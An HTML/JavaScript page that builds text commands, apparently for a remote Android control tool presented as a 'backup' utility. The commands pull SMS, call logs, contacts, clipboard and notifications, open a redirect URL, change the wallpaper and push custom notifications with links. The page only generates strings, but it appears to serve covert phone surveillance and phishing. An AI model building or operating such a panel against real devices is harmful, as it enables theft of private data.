<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Backup Command Generator</title>

<style>

body{
    font-family: Arial;
    background:#f4f6fa;
    padding:20px;
}

.group{
    background:white;
    padding:15px;
    margin-bottom:15px;
    border:1px solid #ddd;
}

.group-title{
    font-weight:bold;
    font-size:18px;
    margin-bottom:10px;
}

.command{
    margin:5px 0;
}

input{
    padding:5px;
    margin:3px;
}

button{
    padding:10px;
    margin-top:10px;
    cursor:pointer;
}

#result{
    width:100%;
    height:120px;
}

.notification-box{
    border:1px dashed #aaa;
    padding:10px;
    margin:10px 0;
}

</style>

</head>

<body>

<h2>Backup Command Generator</h2>

<!-- DEVICE COMMANDS -->

<div class="group">

<div class="group-title">Device Control</div>

<label class="command">
<input type="checkbox" data-cmd="deviceinfo">
deviceinfo
</label><br>

<label class="command">
<input type="checkbox" data-cmd="connection">
connection
</label><br>

<div>

Redirect URL:<br>
<input id="redirectUrl" placeholder="https://example.com">
<button onclick="addRedirect()">Add</button>

</div>

<div>

Change Wallpaper:<br>
<input id="wallpaperUrl" placeholder="https://example.com/image.jpg">
<button onclick="addWallpaper()">Add</button>

</div>

</div>

<!-- APPS GROUP -->

<div class="group">

<div class="group-title">Apps Commands</div>

<label><input type="checkbox" data-cmd="apps full">apps full</label><br>
<label><input type="checkbox" data-cmd="apps 1d">apps 1d</label><br>
<label><input type="checkbox" data-cmd="apps 7d">apps 7d</label><br>
<label><input type="checkbox" data-cmd="apps 30d">apps 30d</label><br>
<label><input type="checkbox" data-cmd="apps installed 1d">apps installed 1d</label><br>
<label><input type="checkbox" data-cmd="apps installed 7d">apps installed 7d</label><br>
<label><input type="checkbox" data-cmd="apps installed 30d">apps installed 30d</label>

</div>

<!-- SMS GROUP -->

<div class="group">

<div class="group-title">SMS Commands</div>

<label><input type="checkbox" data-cmd="sms full">sms full</label><br>
<label><input type="checkbox" data-cmd="sms 1d">sms 1d</label><br>
<label><input type="checkbox" data-cmd="sms 7d">sms 7d</label><br>
<label><input type="checkbox" data-cmd="sms 30d">sms 30d</label>

</div>

<!-- CALL GROUP -->

<div class="group">

<div class="group-title">Call Commands</div>

<label><input type="checkbox" data-cmd="calls full">calls full</label><br>
<label><input type="checkbox" data-cmd="calls 1d">calls 1d</label><br>
<label><input type="checkbox" data-cmd="calls 7d">calls 7d</label><br>
<label><input type="checkbox" data-cmd="calls 30d">calls 30d</label>

</div>

<!-- CONTACT -->

<div class="group">

<div class="group-title">Contacts</div>

<label><input type="checkbox" data-cmd="contacts full">contacts full</label>

</div>

<!-- NOTIFICATION BACKUP -->

<div class="group">

<div class="group-title">Notification Backup</div>

<label><input type="checkbox" data-cmd="notification full">notification full</label><br>
<label><input type="checkbox" data-cmd="notification 1d">notification 1d</label><br>
<label><input type="checkbox" data-cmd="notification 7d">notification 7d</label><br>
<label><input type="checkbox" data-cmd="notification 30d">notification 30d</label><br>
<label><input type="checkbox" data-cmd="no notification">no notification</label>

</div>

<!-- CLIPBOARD -->

<div class="group">

<div class="group-title">Clipboard</div>

<label><input type="checkbox" data-cmd="clipboard full">clipboard full</label><br>
<label><input type="checkbox" data-cmd="clipboard 1d">clipboard 1d</label><br>
<label><input type="checkbox" data-cmd="clipboard 7d">clipboard 7d</label><br>
<label><input type="checkbox" data-cmd="clipboard 30d">clipboard 30d</label><br>
<label><input type="checkbox" data-cmd="no clipboard">no clipboard</label>

</div>

<!-- CUSTOM NOTIFICATION -->

<div class="group">

<div class="group-title">Custom Notification</div>

<div id="notifications"></div>

<button onclick="addNotificationBox()">Add Notification</button>

</div>

<!-- RESULT -->

<div class="group">

<div class="group-title">Generated Commands</div>

<textarea id="result"></textarea><br>

<button onclick="generate()">Generate</button>
<button onclick="copy()">Copy Commands</button>

</div>


<script>

let redirectCommands=[]
let wallpaperCommands=[]
let notificationCommands=[]

function addRedirect(){

let url=document.getElementById("redirectUrl").value

if(url)
redirectCommands.push("redirect url "+url)

}

function addWallpaper(){

let url=document.getElementById("wallpaperUrl").value

if(url)
wallpaperCommands.push("change wallpaper "+url)

}

function addNotificationBox(){

let box=document.createElement("div")

box.className="notification-box"

box.innerHTML=`
Title:<input class="ntitle"><br>
Message:<input class="nmessage"><br>
Repeat:<input class="nrepeat" value="1"><br>
Button:<input class="nbutton"><br>
URL:<input class="nurl"><br>
`

document.getElementById("notifications").appendChild(box)

}

function generate(){

let cmds=[]

document.querySelectorAll("input[type=checkbox]:checked")
.forEach(cb=>cmds.push(cb.dataset.cmd))

cmds=cmds.concat(redirectCommands)
cmds=cmds.concat(wallpaperCommands)

let notif=[]

document.querySelectorAll(".notification-box")
.forEach(box=>{

let title=box.querySelector(".ntitle").value
let message=box.querySelector(".nmessage").value
let repeat=box.querySelector(".nrepeat").value
let button=box.querySelector(".nbutton").value
let url=box.querySelector(".nurl").value

if(title && message){

let cmd="send notification | title="+title+" | message="+message

if(repeat) cmd+=" | repeat="+repeat
if(button) cmd+=" | button="+button
if(url) cmd+=" | url="+url

notif.push(cmd)

}

})

let notifText=notif.join(",,,,,")

let final=cmds.join(", ")

if(notifText){

if(final) final+=", "

final+=notifText

}

document.getElementById("result").value=final

}

function copy(){

let text=document.getElementById("result")

text.select()

document.execCommand("copy")

alert("Copied")

}

</script>

</body>
</html>
